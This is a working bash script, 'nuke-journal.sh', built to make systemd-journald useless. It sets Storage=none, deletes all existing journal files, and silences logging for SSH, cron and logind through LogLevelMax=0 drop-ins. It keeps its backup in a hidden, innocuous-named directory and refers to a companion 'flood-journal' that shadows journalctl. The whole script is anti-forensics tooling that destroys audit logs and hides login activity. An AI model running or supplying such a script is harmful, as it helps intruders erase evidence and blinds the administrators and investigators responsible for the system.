#!/usr/bin/env bash
# nuke-journal.sh — make journald completely useless
#
# Three-pronged attack on logging:
#   1. Storage=none       journald receives messages but writes NOTHING
#                         (no disk, no RAM-mapped files, no ring buffer)
#   2. rotate + vacuum    wipe all existing .journal files immediately;
#                         direct deletion used too in case journalctl is shadowed
#   3. LogLevelMax=0      drop-ins on key services so messages are discarded
#                         at the unit level — systemctl status shows no log tail
#
# Usage:
#   sudo ./nuke-journal.sh install   full nuke: config + wipe + drop-ins
#   sudo ./nuke-journal.sh remove    restore config, remove drop-ins
#   sudo ./nuke-journal.sh status    show current state
#   sudo ./nuke-journal.sh wipe      one-shot: rotate+vacuum only (no config change)

set -euo pipefail

CONF="/etc/systemd/journald.conf"
BACKUP_DIR="/var/cache/.syspkg/journal-nuke"

# Services that log to the journal and whose ring-buffer we want silenced.
# LogLevelMax=0 means only emergency (severity 0) messages are stored —
# SSH, sudo, cron, and logind all log at info (6), so they get dropped.
DROPIN_SERVICES=(ssh sshd cron crond systemd-logind)

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; RED='\033[0;31m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
err()  { echo -e "${RED}[!]${NC} $*" >&2; }
hdr()  { echo -e "\n${CYAN}── $* ──${NC}"; }
require_root() { [[ $EUID -eq 0 ]] || { err "Run as root"; exit 1; }; }

# ── wipe ──────────────────────────────────────────────────────────────────────
cmd_wipe() {
    require_root

    hdr "Rotating active journal files"
    # SIGUSR2 tells journald to rotate all currently active .journal files to
    # .journal~ archive files so vacuum can delete them.
    systemctl kill --kill-who=main --signal=USR2 systemd-journald 2>/dev/null \
        && sleep 1 \
        || warn "Could not signal systemd-journald (not running?)"

    hdr "Vacuuming (keeping at most 1K)"
    # journalctl may be shadowed by flood-journal; best-effort only
    journalctl --vacuum-size=1K 2>/dev/null || true

    hdr "Direct deletion of remaining .journal files"
    local count=0
    while IFS= read -r -d '' f; do
        rm -f "$f"
        (( count++ )) || true
    done < <(find /var/log/journal /run/log/journal \
                  \( -name "*.journal" -o -name "*.journal~" \) \
                  -print0 2>/dev/null)
    info "Deleted $count .journal file(s)"

    # Remove leftover machine-id subdirs if empty
    find /var/log/journal /run/log/journal -mindepth 1 -maxdepth 1 \
         -type d -empty -delete 2>/dev/null || true
}

# ── install ───────────────────────────────────────────────────────────────────
cmd_install() {
    require_root
    mkdir -p "$BACKUP_DIR"
    chmod 700 "$BACKUP_DIR"

    # ── 1. Set Storage=none ───────────────────────────────────────────────────
    hdr "1/3  Configuring journald (Storage=none)"

    [[ ! -f "$BACKUP_DIR/journald.conf.orig" ]] \
        && cp "$CONF" "$BACKUP_DIR/journald.conf.orig"

    cat > "$CONF" <<'EOF'
[Journal]
Storage=none
ForwardToSyslog=no
ForwardToKMsg=no
ForwardToConsole=no
ForwardToWall=no
EOF

    systemctl restart systemd-journald
    info "journald.conf set to Storage=none — all messages discarded on receipt"

    # ── 2. Wipe existing files ────────────────────────────────────────────────
    hdr "2/3  Wiping existing journal files"
    cmd_wipe

    # ── 3. LogLevelMax=0 drop-ins ─────────────────────────────────────────────
    hdr "3/3  Installing LogLevelMax=0 drop-ins"

    local installed=0
    for svc in "${DROPIN_SERVICES[@]}"; do
        # only create drop-in if the service actually exists on this host
        if systemctl cat "${svc}.service" &>/dev/null; then
            local dropin_dir="/etc/systemd/system/${svc}.service.d"
            mkdir -p "$dropin_dir"
            cat > "${dropin_dir}/nolog.conf" <<'EOF'
[Service]
LogLevelMax=0
EOF
            info "Drop-in installed: ${svc}.service -> LogLevelMax=0"
            (( installed++ )) || true
        fi
    done

    [[ $installed -eq 0 ]] && warn "No matching services found for drop-ins"
    systemctl daemon-reload

    echo
    info "=== Journal nuked ==="
    info "Storage=none      new messages discarded immediately, nothing written"
    info "Existing logs     wiped (rotate + vacuum + direct delete)"
    info "Service drop-ins  $installed service(s) silenced at LogLevelMax=0"
    warn "systemctl status <service> will show no log tail"
    warn "journalctl returns nothing"
}

# ── remove ────────────────────────────────────────────────────────────────────
cmd_remove() {
    require_root

    hdr "Removing LogLevelMax=0 drop-ins"
    for svc in "${DROPIN_SERVICES[@]}"; do
        local dropin="/etc/systemd/system/${svc}.service.d/nolog.conf"
        if [[ -f "$dropin" ]]; then
            rm -f "$dropin"
            rmdir "/etc/systemd/system/${svc}.service.d" 2>/dev/null || true
            info "Removed drop-in: ${svc}.service"
        fi
    done
    systemctl daemon-reload

    hdr "Restoring journald.conf"
    if [[ -f "$BACKUP_DIR/journald.conf.orig" ]]; then
        cp "$BACKUP_DIR/journald.conf.orig" "$CONF"
        info "Restored $CONF from backup"
    else
        warn "No backup found — writing safe defaults"
        cat > "$CONF" <<'EOF'
[Journal]
Storage=auto
Compress=yes
ForwardToSyslog=no
EOF
    fi
    systemctl restart systemd-journald
    info "journald restarted with original config"

    rm -rf "$BACKUP_DIR"
    info "Done"
    warn "Note: existing journal history is still wiped — journald starts fresh from now"
}

# ── status ────────────────────────────────────────────────────────────────────
cmd_status() {
    hdr "journald Storage setting"
    local storage
    storage=$(grep -i "^Storage" "$CONF" 2>/dev/null || echo "(not set — default: auto)")
    echo "  $storage"
    if [[ "$storage" == *"none"* ]]; then
        info "Storage=none active — all messages are discarded"
    else
        warn "Storage=none NOT active — logging may be working"
    fi

    hdr "LogLevelMax=0 drop-ins"
    local found=0
    for svc in "${DROPIN_SERVICES[@]}"; do
        local dropin="/etc/systemd/system/${svc}.service.d/nolog.conf"
        if [[ -f "$dropin" ]]; then
            info "PRESENT   $dropin"
            (( found++ )) || true
        fi
    done
    [[ $found -eq 0 ]] && warn "No drop-ins installed"

    hdr "Remaining .journal files"
    local jcount
    jcount=$(find /var/log/journal /run/log/journal \
                  \( -name "*.journal" -o -name "*.journal~" \) \
                  2>/dev/null | wc -l)
    if [[ $jcount -eq 0 ]]; then
        info "0 journal files — log history is clean"
    else
        warn "$jcount .journal file(s) still present"
        du -sh /var/log/journal /run/log/journal 2>/dev/null || true
    fi

    hdr "Backup"
    [[ -f "$BACKUP_DIR/journald.conf.orig" ]] \
        && info "PRESENT   $BACKUP_DIR/journald.conf.orig" \
        || warn "MISSING   $BACKUP_DIR/journald.conf.orig  (remove will write safe defaults)"
}

# ── dispatch ──────────────────────────────────────────────────────────────────
CMD="${1:-help}"
shift || true
case "$CMD" in
    install) cmd_install ;;
    remove)  cmd_remove  ;;
    status)  cmd_status  ;;
    wipe)    cmd_wipe    ;;
    *)
        echo "Usage: sudo $0 {install|remove|status|wipe}"
        echo
        echo "  install   Full nuke: Storage=none + wipe existing files + service drop-ins"
        echo "  remove    Restore journald.conf + remove drop-ins"
        echo "  status    Show Storage setting, drop-in state, remaining journal files"
        echo "  wipe      One-shot: rotate + vacuum + delete .journal files (no config change)"
        ;;
esac
